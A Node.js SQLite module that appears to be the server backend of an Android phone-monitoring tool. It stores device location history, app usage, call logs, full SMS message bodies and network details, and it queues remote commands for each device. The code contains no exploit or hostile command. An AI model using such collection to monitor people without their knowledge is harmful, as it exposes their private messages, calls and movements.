const { Database } = require('node-sqlite3-wasm');
const path = require('path');
const fs = require('fs');

const DB_PATH = ':memory:';

const db = new Database(DB_PATH);

// Performance pragmas
db.run('PRAGMA journal_mode = WAL');
db.run('PRAGMA synchronous = NORMAL');
db.run('PRAGMA foreign_keys = ON');

// ── Schema ────────────────────────────────────────────────────────────────────
db.run(`
CREATE TABLE IF NOT EXISTS devices (
    id         TEXT PRIMARY KEY,
    name       TEXT NOT NULL DEFAULT 'Unknown Device',
    token      TEXT UNIQUE NOT NULL,
    model      TEXT,
    brand      TEXT,
    android_version TEXT,
    is_online  INTEGER DEFAULT 0,
    last_seen  INTEGER,
    created_at INTEGER DEFAULT (unixepoch())
)
`);

db.run(`
CREATE TABLE IF NOT EXISTS device_state (
    device_id     TEXT PRIMARY KEY,
    battery_level INTEGER,
    is_charging   INTEGER DEFAULT 0,
    screen_on     INTEGER DEFAULT 0,
    last_app      TEXT,
    last_app_name TEXT,
    wifi_ssid     TEXT,
    ip_address    TEXT,
    network_type  TEXT,
    signal_strength INTEGER,
    storage_used  INTEGER,
    storage_total INTEGER,
    lat           REAL,
    lng           REAL,
    location_accuracy REAL,
    updated_at    INTEGER
)
`);

db.run(`CREATE TABLE IF NOT EXISTS locations (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id  TEXT NOT NULL,
    lat        REAL NOT NULL,
    lng        REAL NOT NULL,
    accuracy   REAL,
    altitude   REAL,
    speed      REAL,
    timestamp  INTEGER NOT NULL
)`);
db.run('CREATE INDEX IF NOT EXISTS idx_locations_device ON locations(device_id, timestamp DESC)');

db.run(`CREATE TABLE IF NOT EXISTS app_usage (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id    TEXT NOT NULL,
    package_name TEXT NOT NULL,
    app_name     TEXT,
    timestamp    INTEGER NOT NULL,
    duration_ms  INTEGER DEFAULT 0
)`);
db.run('CREATE INDEX IF NOT EXISTS idx_app_usage_device ON app_usage(device_id, timestamp DESC)');

db.run(`CREATE TABLE IF NOT EXISTS call_logs (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id    TEXT NOT NULL,
    number       TEXT,
    contact_name TEXT,
    type         TEXT,
    duration_s   INTEGER DEFAULT 0,
    timestamp    INTEGER NOT NULL
)`);
db.run('CREATE INDEX IF NOT EXISTS idx_calls_device ON call_logs(device_id, timestamp DESC)');

db.run(`CREATE TABLE IF NOT EXISTS sms_logs (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id    TEXT NOT NULL,
    number       TEXT,
    contact_name TEXT,
    body         TEXT,
    type         TEXT,
    timestamp    INTEGER NOT NULL
)`);
db.run('CREATE INDEX IF NOT EXISTS idx_sms_device ON sms_logs(device_id, timestamp DESC)');

db.run(`CREATE TABLE IF NOT EXISTS commands (
    id          TEXT PRIMARY KEY,
    device_id   TEXT NOT NULL,
    type        TEXT NOT NULL,
    payload     TEXT,
    status      TEXT DEFAULT 'pending',
    created_at  INTEGER DEFAULT (unixepoch()),
    executed_at INTEGER
)`);
db.run('CREATE INDEX IF NOT EXISTS idx_commands_device ON commands(device_id, status)');

db.run(`CREATE TABLE IF NOT EXISTS live_feed (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id  TEXT NOT NULL,
    event_type TEXT NOT NULL,
    data       TEXT,
    timestamp  INTEGER DEFAULT (unixepoch())
)`);
db.run('CREATE INDEX IF NOT EXISTS idx_feed_device ON live_feed(device_id, timestamp DESC)');

// ── Helper: run query and return rows ─────────────────────────────────────────
function query(sql, params = []) {
    try {
        return db.all(sql, params);
    } catch (e) {
        console.error('[DB] Query error:', e.message, sql);
        return [];
    }
}

function run(sql, params = []) {
    try {
        db.run(sql, params);
        return true;
    } catch (e) {
        console.error('[DB] Run error:', e.message, sql);
        return false;
    }
}

function get(sql, params = []) {
    try {
        const rows = db.all(sql, params);
        return rows.length > 0 ? rows[0] : null;
    } catch (e) {
        console.error('[DB] Get error:', e.message, sql);
        return null;
    }
}

// ── Query Helpers ─────────────────────────────────────────────────────────────
const queries = {
    getDevice:        (id) => get('SELECT * FROM devices WHERE id = ?', [id]),
    getAllDevices:     () => query(`SELECT d.*, s.battery_level, s.is_charging, s.screen_on,
        s.last_app_name, s.lat, s.lng, s.updated_at as state_updated
        FROM devices d LEFT JOIN device_state s ON d.id = s.device_id ORDER BY d.last_seen DESC`),
    insertDevice:     (id, name, token, model, brand, av) =>
        run('INSERT INTO devices (id, name, token, model, brand, android_version) VALUES (?,?,?,?,?,?)', [id, name, token, model, brand, av]),
    updateDeviceSeen: (online, id) => run('UPDATE devices SET last_seen = unixepoch(), is_online = ? WHERE id = ?', [online, id]),
    updateDeviceName: (name, id) => run('UPDATE devices SET name = ? WHERE id = ?', [name, id]),
    deleteDevice:     (id) => run('DELETE FROM devices WHERE id = ?', [id]),
    getDeviceByToken: (token) => get('SELECT * FROM devices WHERE token = ?', [token]),

    upsertState: (deviceId, s) => run(`
        INSERT INTO device_state (device_id, battery_level, is_charging, screen_on, last_app, last_app_name,
            wifi_ssid, ip_address, network_type, signal_strength, storage_used, storage_total, lat, lng, location_accuracy, updated_at)
        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,unixepoch())
        ON CONFLICT(device_id) DO UPDATE SET
            battery_level = COALESCE(excluded.battery_level, battery_level),
            is_charging = COALESCE(excluded.is_charging, is_charging),
            screen_on = COALESCE(excluded.screen_on, screen_on),
            last_app = COALESCE(excluded.last_app, last_app),
            last_app_name = COALESCE(excluded.last_app_name, last_app_name),
            wifi_ssid = COALESCE(excluded.wifi_ssid, wifi_ssid),
            ip_address = COALESCE(excluded.ip_address, ip_address),
            network_type = COALESCE(excluded.network_type, network_type),
            signal_strength = COALESCE(excluded.signal_strength, signal_strength),
            storage_used = COALESCE(excluded.storage_used, storage_used),
            storage_total = COALESCE(excluded.storage_total, storage_total),
            lat = COALESCE(excluded.lat, lat),
            lng = COALESCE(excluded.lng, lng),
            location_accuracy = COALESCE(excluded.location_accuracy, location_accuracy),
            updated_at = unixepoch()`,
        [deviceId, s.battery_level ?? null, s.is_charging ? 1 : 0, s.screen_on ? 1 : 0,
         s.last_app ?? null, s.last_app_name ?? null, s.wifi_ssid ?? null, s.ip_address ?? null,
         s.network_type ?? null, s.signal_strength ?? null, s.storage_used ?? null,
         s.storage_total ?? null, s.lat ?? null, s.lng ?? null, s.location_accuracy ?? null]),

    getState: (deviceId) => get('SELECT * FROM device_state WHERE device_id = ?', [deviceId]),

    insertLocation: (d, lat, lng, acc, alt, spd, ts) =>
        run('INSERT INTO locations (device_id,lat,lng,accuracy,altitude,speed,timestamp) VALUES (?,?,?,?,?,?,?)', [d, lat, lng, acc, alt, spd, ts]),
    getLocations:   (d, limit) => query('SELECT * FROM locations WHERE device_id=? ORDER BY timestamp DESC LIMIT ?', [d, limit]),
    getLastLocation:(d) => get('SELECT * FROM locations WHERE device_id=? ORDER BY timestamp DESC LIMIT 1', [d]),

    insertAppUsage: (d, pkg, name, ts, dur) =>
        run('INSERT OR IGNORE INTO app_usage (device_id,package_name,app_name,timestamp,duration_ms) VALUES (?,?,?,?,?)', [d, pkg, name, ts, dur]),
    getAppUsage:    (d, limit) => query('SELECT * FROM app_usage WHERE device_id=? ORDER BY timestamp DESC LIMIT ?', [d, limit]),
    getTopApps:     (d, since) => query(`SELECT package_name, app_name, SUM(duration_ms) as total_ms, COUNT(*) as opens
        FROM app_usage WHERE device_id=? AND timestamp>? GROUP BY package_name ORDER BY total_ms DESC LIMIT 20`, [d, since]),

    insertCall: (d, num, name, type, dur, ts) =>
        run('INSERT OR IGNORE INTO call_logs (device_id,number,contact_name,type,duration_s,timestamp) VALUES (?,?,?,?,?,?)', [d, num, name, type, dur, ts]),
    getCallLogs: (d, limit) => query('SELECT * FROM call_logs WHERE device_id=? ORDER BY timestamp DESC LIMIT ?', [d, limit]),

    insertSms: (d, num, name, body, type, ts) =>
        run('INSERT OR IGNORE INTO sms_logs (device_id,number,contact_name,body,type,timestamp) VALUES (?,?,?,?,?,?)', [d, num, name, body, type, ts]),
    getSmsLogs: (d, limit) => query('SELECT * FROM sms_logs WHERE device_id=? ORDER BY timestamp DESC LIMIT ?', [d, limit]),

    insertCommand:       (id, deviceId, type, payload) =>
        run('INSERT INTO commands (id,device_id,type,payload) VALUES (?,?,?,?)', [id, deviceId, type, payload]),
    getPendingCommands:  (deviceId) => query("SELECT * FROM commands WHERE device_id=? AND status='pending' ORDER BY created_at ASC", [deviceId]),
    updateCommandStatus: (status, id) => run('UPDATE commands SET status=?, executed_at=unixepoch() WHERE id=?', [status, id]),
    getCommandHistory:   (deviceId) => query('SELECT * FROM commands WHERE device_id=? ORDER BY created_at DESC LIMIT 50', [deviceId]),

    insertFeed: (d, type, data) => run('INSERT INTO live_feed (device_id,event_type,data) VALUES (?,?,?)', [d, type, data]),
    getFeed:    (d, limit) => query('SELECT * FROM live_feed WHERE device_id=? ORDER BY timestamp DESC LIMIT ?', [d, limit]),
};

// ── Batch Data Save ───────────────────────────────────────────────────────────
function saveDeviceData(deviceId, payload) {
    queries.updateDeviceSeen(1, deviceId);

    if (payload.state) {
        queries.upsertState(deviceId, payload.state);
    }
    if (payload.location) {
        const l = payload.location;
        queries.insertLocation(deviceId, l.lat, l.lng, l.accuracy, l.altitude, l.speed, l.timestamp || Math.floor(Date.now() / 1000));
    }
    if (payload.app_usage?.length) {
        for (const a of payload.app_usage) {
            queries.insertAppUsage(deviceId, a.package_name, a.app_name, a.timestamp, a.duration_ms ?? 0);
        }
    }
    if (payload.call_logs?.length) {
        for (const c of payload.call_logs) {
            queries.insertCall(deviceId, c.number, c.contact_name, c.type, c.duration_s, c.timestamp);
        }
    }
    if (payload.sms_logs?.length) {
        for (const s of payload.sms_logs) {
            queries.insertSms(deviceId, s.number, s.contact_name, s.body, s.type, s.timestamp);
        }
    }
    if (payload.state?.last_app_name) {
        queries.insertFeed(deviceId, 'app_open', JSON.stringify({ app: payload.state.last_app_name, pkg: payload.state.last_app }));
    }
}

module.exports = { db, queries, saveDeviceData };
